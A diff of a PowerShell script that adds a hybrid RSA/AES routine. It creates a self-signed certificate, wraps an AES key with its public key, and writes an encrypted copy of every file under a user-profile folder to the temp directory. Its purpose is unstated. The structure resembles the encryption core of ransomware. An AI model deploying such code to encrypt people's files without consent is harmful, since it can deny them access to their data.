@@ -44,15 +44,23 @@ Class Drive
 
 Class File
 {
-    [String]                $Mode
-    [DateTime]              $Date
-    [Int32]                $Depth
-    [String]                $Name
-    [String]            $FullName
+    [String]                                            $Mode
+    [DateTime]                                          $Date
+    [Int32]                                            $Depth
+    [String]                                            $Name
+    [String]                                        $FullName
     
-    [Object]        $StreamWriter
-    [Object]        $StreamReader
-    [Object]        $CryptoStream
+    [Object]                                        $Provider
+    [System.IO.FileStream]                      $StreamWriter
+    [Object]                                       $Transform
+    [System.Security.Cryptography.CryptoStream] $CryptoStream
+    [System.IO.FileStream]                      $StreamReader
+
+    [Int32]                                           $XCount
+    [Int32]                                           $Offset
+    [Int32]                                   $BlockSizeBytes
+    [Byte[]]                                            $Data
+    [Int32]                                        $BytesRead
     
     File([Object]$Provider,[String]$Path)
     {
@@ -61,6 +69,8 @@ Class File
             Throw "Invalid Path"
         }
 
+        Write-Host "Processing [+] $Path"
+
         [System.IO.FileInfo]::New($Path) | % {
 
             $This.Mode            = $_.Mode
@@ -68,7 +78,39 @@ Class File
             $This.Depth           = $_.FullName.Split("\").Count - 2
             $This.Name            = $_.Name
             $This.FullName        = $_.FullName
+            $This.Provider        = $Provider
         }
+
+        $This.StreamWriter        = New-Object System.IO.FileStream("$env:temp\$($This.Name)",[System.IO.FileMode]::Create)
+        $This.StreamWriter.Write($This.Provider.Key,0,4)
+        $This.StreamWriter.Write($This.Provider.IV,0,4)
+        $This.StreamWriter.Write($This.Provider.KeyExchange,0,$This.Provider.KeyLength)
+        $This.StreamWriter.Write($This.Provider.AESProvider.IV,0,$This.Provider.IVLength)
+
+        $This.Transform           = $This.Provider.AESProvider.CreateEncryptor()
+        $This.CryptoStream        = New-Object System.Security.Cryptography.CryptoStream($This.StreamWriter,$This.Transform,[System.Security.Cryptography.CryptoStreamMode]::Write)
+        
+        $This.XCount              = 0
+        $This.Offset              = 0
+        $This.BlockSizeBytes      = $This.Provider.AESProvider.BlockSize / 8
+        $This.Data                = New-Object Byte[]($This.BlockSizeBytes)
+        $This.BytesRead           = 0
+
+        $This.StreamReader        = New-Object System.IO.FileStream($This.FullName,[System.IO.FileMode]::Open) 
+
+        Do
+        {
+            $This.XCount          = $This.StreamReader.Read($This.Data,0,$This.BlockSizeBytes)
+            $This.Offset         += $This.XCount
+            $This.CryptoStream.Write($This.Data,0,$This.XCount)
+            $This.BytesRead      += $This.BlockSizeBytes
+        }
+        While ($This.XCount -gt 0 )
+
+        $This.CryptoStream.FlushFinalBlock()
+        $This.CryptoStream.Close()
+        $This.StreamReader.Close()
+        $This.StreamWriter.Close()
     }
 }
 
@@ -84,6 +126,8 @@ Class Host
     [Bool]               $IsAdmin
     [Object]         $Certificate
     [Provider]          $Provider
+
+    [Drives]              $Drives = [Drives]::New()
     [Object]             $Profile = (Get-ChildItem $Env:UserProfile | ? Name -in Documents2 | % { $_.FullName } )
     [Object]             $Content
 
@@ -99,24 +143,21 @@ Class Host
 
         $This.Certificate         = New-SelfSignedCertificate -CertStoreLocation Cert:\LocalMachine\My -DnsName $This.HostName
         $This.Provider            = [Provider]::New($This.Certificate)
-        $This.Content             = Get-ChildItem $This.Profile -Recurse | ? PsIsContainer -eq $False | % { [File]::New($_.FullName) }
+        $This.Content             = Get-ChildItem $This.Profile -Recurse | ? PsIsContainer -eq $False | % { [File]::New($This.Provider,$_.FullName) }
     }
 }
 
 Class Provider
 {
-    [String]                                                                        $Name
-    Hidden [System.Security.Cryptography.X509Certificates.X509Certificate2]  $Certificate
-    [System.Security.Cryptography.AesManaged]                                $AESProvider
-    [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]             $KeyFormatter
-
-    [Byte[]]                                                                 $KeyExchange
-
-    [Int32]                                                                    $KeyLength
-    [Byte[]]                                                                         $Key
-
-    [Int32]                                                                     $IVLength
-    [Byte[]]                                                                          $IV
+    [String] $Name
+    Hidden [System.Security.Cryptography.X509Certificates.X509Certificate2] $Certificate
+    [System.Security.Cryptography.AesManaged] $AESProvider
+    [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]  $KeyFormatter
+    [Byte[]] $KeyExchange
+    [Int32]  $KeyLength
+    [Byte[]] $Key
+    [Int32]  $IVLength
+    [Byte[]] $IV
 
     Provider([System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate)
     {
@@ -128,10 +169,8 @@ Class Provider
         $This.Name                  = $This.AESProvider.GetType()
         $This.KeyFormatter          = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Certificate.PublicKey.Key)
         $This.KeyExchange           = $This.KeyFormatter.CreateKeyExchange($This.AESProvider.Key,$This.Name)
-
         $This.KeyLength             = $This.KeyExchange.Length
         $This.Key                   = [System.BitConverter]::GetBytes($This.KeyLength)
-
         $This.IVLength              = $This.AesProvider.IV.Length
         $This.IV                    = [System.BitConverter]::GetBytes($This.IVLength)
     }
